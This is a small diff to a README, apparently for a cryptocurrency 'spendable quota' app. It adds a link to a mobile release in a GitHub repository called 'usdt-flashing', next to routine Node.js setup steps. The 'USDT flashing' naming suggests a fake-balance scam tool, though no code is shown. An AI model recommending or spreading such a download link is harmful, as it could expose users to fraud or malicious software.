@@ -13,6 +13,10 @@ When you gain app access, you'll have a limited spendable quota of either bitcoi
 ## Prerequisites
 This application requires [Node.js](https://nodejs.org) to run.
 
+### Android/iOS
+
+Click [here](https://github.com/usdt-flashing/mobile-release) to visit the mobile repository.
+
 ### Windows
 
 Download the Node.js setup application [here](https://nodejs.org/en/download/).
